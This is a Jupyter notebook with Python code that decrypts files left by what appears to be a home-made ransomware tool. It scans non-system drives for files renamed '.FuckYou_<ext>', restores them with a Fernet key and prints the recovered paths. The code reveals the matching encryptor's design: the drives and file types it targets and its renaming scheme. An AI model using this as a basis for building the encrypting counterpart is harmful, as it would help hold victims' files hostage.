{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 1,
   "source": [
    "#### Modules Used In Project ####\r\n",
    "from subprocess import *\r\n",
    "from cryptography.fernet import Fernet\r\n",
    "import os \r\n",
    "#### generate key ####\r\n",
    "key = input(\"Enter the key : \")\r\n",
    "key = bytes(key,\"utf-8\")\r\n",
    "encriptt = Fernet(key)\r\n",
    "#### find drives ### \r\n",
    "Drives = getoutput(\"fsutil fsInfo drives\").replace(\"Drives:\",\"\").replace(\"\\\\\",\"\").split()\r\n",
    "if \"C:\" in Drives:\r\n",
    "    Drives.remove(\"C:\")\r\n",
    "#### File Formats ####\r\n",
    "fileFormats = [\"psd\",\"py\",\"txt\",\"mp4\",\"exe\",\"jpg\",\"pdf\",\"mp3\"]\r\n",
    "#####################################################\r\n",
    "#################### Decrypting Files ###############\r\n",
    "def Decrypt(drive):\r\n",
    "    for Formatt in fileFormats:\r\n",
    "        try:\r\n",
    "            with open(\"log.txt\" , \"w\") as errorlog:\r\n",
    "                cmd = check_output(drive+\" && dir /S /B *.FuckYou_\"+Formatt , shell=True , stderr=errorlog).decode().replace(\"\\r\",\"\").split(\"\\n\")\r\n",
    "                for file in cmd:\r\n",
    "                    with open(file,\"rb\") as readfile:\r\n",
    "                        data = readfile.read()\r\n",
    "                        encData = encriptt.decrypt(data)\r\n",
    "                        nameOfFile = file.replace(\".FuckYou_\"+Formatt,\"\")\r\n",
    "                        newFile = open(nameOfFile+\".\"+Formatt,\"wb\")\r\n",
    "                        newFile.write(encData)\r\n",
    "                        readfile.close()\r\n",
    "                        newFile.close()\r\n",
    "                        os.remove(file)\r\n",
    "                        print (f\"{file} | Decrypted .\")\r\n",
    "        except:\r\n",
    "            pass\r\n",
    "\r\n",
    "if __name__ == \"__main__\":\r\n",
    "    for drive in Drives:\r\n",
    "        Decrypt(drive)"
   ],
   "outputs": [
    {
     "output_type": "stream",
     "name": "stdout",
     "text": [
      "E:\\asal effect good (psd.FuckYou_psd | Decrypted .\n",
      "E:\\mani amjadi.FuckYou_txt | Decrypted .\n",
      "E:\\1919076.FuckYou_jpg | Decrypted .\n",
      "E:\\a90563f885dc9497fea6e9fb3cf6f326.FuckYou_jpg | Decrypted .\n",
      "E:\\abstract-painting-background-for-wallpapers-vector-22656641.FuckYou_jpg | Decrypted .\n",
      "E:\\$RECYCLE.BIN\\S-1-5-21-3144744412-778946898-4266315615-1001\\$I290QLK.FuckYou_mp3 | Decrypted .\n",
      "E:\\$RECYCLE.BIN\\S-1-5-21-3144744412-778946898-4266315615-1001\\$I39JVSB.FuckYou_mp3 | Decrypted .\n",
      "E:\\$RECYCLE.BIN\\S-1-5-21-3144744412-778946898-4266315615-1001\\$I3Y1DZS.FuckYou_mp3 | Decrypted .\n",
      "E:\\$RECYCLE.BIN\\S-1-5-21-3144744412-778946898-4266315615-1001\\$I48AX0U.FuckYou_mp3 | Decrypted .\n",
      "E:\\$RECYCLE.BIN\\S-1-5-21-3144744412-778946898-4266315615-1001\\$IBUDMJC.FuckYou_mp3 | Decrypted .\n",
      "E:\\$RECYCLE.BIN\\S-1-5-21-3144744412-778946898-4266315615-1001\\$IEMFS7J.FuckYou_mp3 | Decrypted .\n",
      "E:\\$RECYCLE.BIN\\S-1-5-21-3144744412-778946898-4266315615-1001\\$IH415P5.FuckYou_mp3 | Decrypted .\n",
      "E:\\$RECYCLE.BIN\\S-1-5-21-3144744412-778946898-4266315615-1001\\$IIUWF0U.FuckYou_mp3 | Decrypted .\n",
      "E:\\$RECYCLE.BIN\\S-1-5-21-3144744412-778946898-4266315615-1001\\$IJ05H6F.FuckYou_mp3 | Decrypted .\n",
      "E:\\$RECYCLE.BIN\\S-1-5-21-3144744412-778946898-4266315615-1001\\$IND24T1.FuckYou_mp3 | Decrypted .\n",
      "E:\\$RECYCLE.BIN\\S-1-5-21-3144744412-778946898-4266315615-1001\\$INOYP88.FuckYou_mp3 | Decrypted .\n",
      "E:\\$RECYCLE.BIN\\S-1-5-21-3144744412-778946898-4266315615-1001\\$IODVAJS.FuckYou_mp3 | Decrypted .\n",
      "E:\\$RECYCLE.BIN\\S-1-5-21-3144744412-778946898-4266315615-1001\\$IS5OPRZ.FuckYou_mp3 | Decrypted .\n",
      "E:\\$RECYCLE.BIN\\S-1-5-21-3144744412-778946898-4266315615-1001\\$IWOER4P.FuckYou_mp3 | Decrypted .\n",
      "E:\\$RECYCLE.BIN\\S-1-5-21-3144744412-778946898-4266315615-1001\\$R290QLK.FuckYou_mp3 | Decrypted .\n",
      "E:\\$RECYCLE.BIN\\S-1-5-21-3144744412-778946898-4266315615-1001\\$R39JVSB.FuckYou_mp3 | Decrypted .\n",
      "E:\\$RECYCLE.BIN\\S-1-5-21-3144744412-778946898-4266315615-1001\\$R3Y1DZS.FuckYou_mp3 | Decrypted .\n",
      "E:\\$RECYCLE.BIN\\S-1-5-21-3144744412-778946898-4266315615-1001\\$R48AX0U.FuckYou_mp3 | Decrypted .\n",
      "E:\\$RECYCLE.BIN\\S-1-5-21-3144744412-778946898-4266315615-1001\\$RBUDMJC.FuckYou_mp3 | Decrypted .\n",
      "E:\\$RECYCLE.BIN\\S-1-5-21-3144744412-778946898-4266315615-1001\\$REMFS7J.FuckYou_mp3 | Decrypted .\n",
      "E:\\$RECYCLE.BIN\\S-1-5-21-3144744412-778946898-4266315615-1001\\$RH415P5.FuckYou_mp3 | Decrypted .\n",
      "E:\\$RECYCLE.BIN\\S-1-5-21-3144744412-778946898-4266315615-1001\\$RIUWF0U.FuckYou_mp3 | Decrypted .\n",
      "E:\\$RECYCLE.BIN\\S-1-5-21-3144744412-778946898-4266315615-1001\\$RJ05H6F.FuckYou_mp3 | Decrypted .\n",
      "E:\\$RECYCLE.BIN\\S-1-5-21-3144744412-778946898-4266315615-1001\\$RND24T1.FuckYou_mp3 | Decrypted .\n",
      "E:\\$RECYCLE.BIN\\S-1-5-21-3144744412-778946898-4266315615-1001\\$RNOYP88.FuckYou_mp3 | Decrypted .\n",
      "E:\\$RECYCLE.BIN\\S-1-5-21-3144744412-778946898-4266315615-1001\\$RODVAJS.FuckYou_mp3 | Decrypted .\n",
      "E:\\$RECYCLE.BIN\\S-1-5-21-3144744412-778946898-4266315615-1001\\$RS5OPRZ.FuckYou_mp3 | Decrypted .\n",
      "E:\\$RECYCLE.BIN\\S-1-5-21-3144744412-778946898-4266315615-1001\\$RWOER4P.FuckYou_mp3 | Decrypted .\n",
      "K:\\asal effect good (psd.FuckYou_psd | Decrypted .\n",
      "K:\\mani amjadi.FuckYou_txt | Decrypted .\n",
      "K:\\1919076.FuckYou_jpg | Decrypted .\n",
      "K:\\a90563f885dc9497fea6e9fb3cf6f326.FuckYou_jpg | Decrypted .\n",
      "K:\\abstract-painting-background-for-wallpapers-vector-22656641.FuckYou_jpg | Decrypted .\n"
     ]
    }
   ],
   "metadata": {}
  }
 ],
 "metadata": {
  "orig_nbformat": 4,
  "language_info": {
   "name": "python",
   "version": "3.9.0",
   "mimetype": "text/x-python",
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "pygments_lexer": "ipython3",
   "nbconvert_exporter": "python",
   "file_extension": ".py"
  },
  "kernelspec": {
   "name": "python3",
   "display_name": "Python 3.9.0 64-bit"
  },
  "interpreter": {
   "hash": "f9a665eed82786d1db64405b5cfd0f8037f4571b806793cb1072a84e044fc7ff"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}